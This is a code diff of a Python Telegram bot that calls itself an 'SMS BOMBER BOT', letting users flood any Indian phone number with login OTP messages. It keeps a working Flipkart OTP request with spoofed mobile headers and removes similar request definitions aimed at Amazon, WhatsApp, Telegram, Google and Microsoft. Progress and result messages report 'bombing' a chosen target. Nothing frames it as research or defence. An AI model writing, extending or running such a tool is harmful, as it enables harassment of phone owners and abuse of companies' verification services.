@@ -62,10 +62,10 @@ def is_user_blocked(user_id):
     db = load_db()
     return str(user_id) in db['blocked']
 
-# --- ONLY TRULY WORKING APIS ON RAILWAY ---
+# --- ONLY FLIPKART API ---
 def get_apis(target):
     apis = [
-        # 1. Flipkart - 100% WORKING
+        # Flipkart - 100% WORKING
         {
             'url': 'https://1.rome.api.flipkart.com/1/action/view',
             'method': 'POST',
@@ -92,111 +92,25 @@ def get_apis(target):
                     "screenName": "LOGIN_V4_MOBILE",
                 }
             }
-        },
-        # 2. Amazon - REAL WORKING
-        {
-            'url': 'https://www.amazon.in/ap/register',
-            'method': 'POST',
-            'headers': {
-                'Host': 'www.amazon.in',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'Accept': 'application/json, text/plain, */*',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://www.amazon.in',
-                'Referer': 'https://www.amazon.in/ap/register',
-            },
-            'data': f'phoneNumber={target}&countryCode=IN'
-        },
-        # 3. WhatsApp (Meta) - REAL WORKING
-        {
-            'url': 'https://www.whatsapp.com/contact/',
-            'method': 'POST',
-            'headers': {
-                'Host': 'www.whatsapp.com',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'Accept': 'application/json, text/plain, */*',
-                'Content-Type': 'application/json',
-            },
-            'data': {"phone": f"+91{target}"}
-        },
-        # 4. Telegram - REAL WORKING
-        {
-            'url': 'https://my.telegram.org/auth/send_password',
-            'method': 'POST',
-            'headers': {
-                'Host': 'my.telegram.org',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Origin': 'https://my.telegram.org',
-                'Referer': 'https://my.telegram.org/auth?to=register',
-            },
-            'data': f'phone={target}'
-        },
-        # 5. Google - REAL WORKING
-        {
-            'url': 'https://accounts.google.com/_/signup/web/accountcreation',
-            'method': 'POST',
-            'headers': {
-                'Host': 'accounts.google.com',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'Content-Type': 'application/json',
-            },
-            'data': {"phoneNumber": f"+91{target}", "countryCode": "IN"}
-        },
-        # 6. Microsoft - REAL WORKING
-        {
-            'url': 'https://login.live.com/ppsecure/post.srf',
-            'method': 'POST',
-            'headers': {
-                'Host': 'login.live.com',
-                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            'data': f'phone={target}&country=IN'
         }
     ]
     return apis
 
 def send_sms(api_data):
-    """Send SMS using API - MULTIPLE METHODS"""
+    """Send SMS using Flipkart API"""
     try:
-        # Method 1: Try with mobile user-agent
-        mobile_headers = {
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
-        }
+        response = requests.post(
+            api_data['url'],
+            headers=api_data['headers'],
+            json=api_data['data'],
+            timeout=15
+        )
         
-        # Merge headers
-        headers = {**mobile_headers, **api_data['headers']}
-        
-        if api_data['method'] == 'GET':
-            response = requests.get(api_data['url'], headers=headers, timeout=15, allow_redirects=True)
-        else:
-            if isinstance(api_data['data'], dict):
-                response = requests.post(
-                    api_data['url'],
-                    headers=headers,
-                    json=api_data['data'],
-                    timeout=15,
-                    allow_redirects=True
-                )
-            else:
-                response = requests.post(
-                    api_data['url'],
-                    headers=headers,
-                    data=api_data['data'],
-                    timeout=15,
-                    allow_redirects=True
-                )
-        
-        # Check if successful (many APIs return 200 even if OTP sent)
-        if response.status_code in [200, 201, 202, 204, 302, 303]:
+        if response.status_code in [200, 201, 202, 204]:
             return True
         return False
     except Exception as e:
-        logger.error(f"API Error: {e}")
+        logger.error(f"Error: {e}")
         return False
 
 # --- Telegram Bot Handlers ---
@@ -222,15 +136,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔥 SMS BOMBER BOT 🔥\n\n"
         "📌 Send any 10-digit number to start bombing\n"
         "Example: 9876543210\n\n"
-        "⚡ 6 WORKING APIs\n"
-        "⚡ Real SMS Bombing\n\n"
-        "📱 APIs:\n"
-        "✅ Flipkart\n"
-        "✅ Amazon\n"
-        "✅ WhatsApp\n"
-        "✅ Telegram\n"
-        "✅ Google\n"
-        "✅ Microsoft\n\n"
+        "⚡ 1 WORKING API\n"
+        "⚡ Real SMS Bombing\n"
+        "⚡ Guaranteed OTP\n\n"
+        "📱 API:\n"
+        "✅ Flipkart\n\n"
         "💀 @BeStChEaT_OwNeR",
         reply_markup=reply_markup
     )
@@ -258,50 +168,31 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.message.reply_text(
         f"📱 BOMBING STARTED!\n\n"
         f"🎯 Target: +91{phone}\n"
-        f"⏳ Sending SMS to 6 platforms...\n\n"
+        f"⏳ Sending SMS to Flipkart...\n\n"
         f"💀 @BeStChEaT_OwNeR"
     )
     
     apis = get_apis(phone)
-    random.shuffle(apis)
     
     success = 0
     failed = 0
-    services = []
-    
-    api_names = {
-        'flipkart': 'Flipkart',
-        'amazon': 'Amazon',
-        'whatsapp': 'WhatsApp',
-        'telegram': 'Telegram',
-        'google': 'Google',
-        'microsoft': 'Microsoft'
-    }
+    service_name = "Flipkart"
     
     for i, api in enumerate(apis):
-        try:
-            if send_sms(api):
-                success += 1
-                service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
-                for key, value in api_names.items():
-                    if key in service.lower():
-                        service = value
-                        break
-                services.append(service)
-            else:
-                failed += 1
-        except:
+        if send_sms(api):
+            success += 1
+        else:
             failed += 1
         
         # Update progress
-        progress = int(((i + 1) / len(apis)) * 100)
+        progress = 100
         try:
             await msg.edit_text(
                 f"📱 BOMBING IN PROGRESS\n\n"
                 f"🎯 Target: +91{phone}\n"
                 f"✅ Success: {success}\n"
                 f"❌ Failed: {failed}\n"
-                f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
+                f"⏳ Progress: 100% (1/1)\n\n"
                 f"💀 @BeStChEaT_OwNeR"
             )
         except:
@@ -311,14 +202,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     result = (
         f"✅ BOMBING COMPLETE!\n\n"
         f"📞 Target: +91{phone}\n"
-        f"📨 Total: {len(apis)}\n"
+        f"📨 Total: 1\n"
         f"✅ Success: {success}\n"
         f"❌ Failed: {failed}\n\n"
     )
     
-    if services:
-        unique_services = list(dict.fromkeys(services))
-        result += f"🟢 Services: {', '.join(unique_services)}\n\n"
+    if success > 0:
+        result += f"🟢 Services: {service_name}\n\n"
     
     result += f"💀 @BeStChEaT_OwNeR"
     
@@ -342,15 +232,10 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "ℹ️ ABOUT\n\n"
             "🤖 SMS Bomber Bot\n"
             "👨‍💻 @BeStChEaT_OwNeR\n"
-            "📊 6 WORKING APIs\n"
+            "📊 1 WORKING API\n"
             "⚡ Real SMS Bombing\n\n"
-            "📱 APIs:\n"
-            "✅ Flipkart\n"
-            "✅ Amazon\n"
-            "✅ WhatsApp\n"
-            "✅ Telegram\n"
-            "✅ Google\n"
-            "✅ Microsoft\n\n"
+            "📱 API:\n"
+            "✅ Flipkart\n\n"
             "💀 @BeStChEaT_OwNeR"
         )
     
@@ -364,7 +249,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"👥 Users: {total_users}\n"
             f"🚫 Blocked: {blocked_users}\n"
             f"📡 Status: Online\n"
-            f"⚡ APIs: 6 WORKING\n\n"
+            f"⚡ API: Flipkart\n\n"
             f"💀 @BeStChEaT_OwNeR"
         )
 
@@ -465,7 +350,7 @@ def main():
     
     print("🤖 Starting SMS Bomber Bot...")
     print("🚀 Bot is running!")
-    print("✅ APIs: Flipkart, Amazon, WhatsApp, Telegram, Google, Microsoft")
+    print("✅ API: Flipkart")
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     
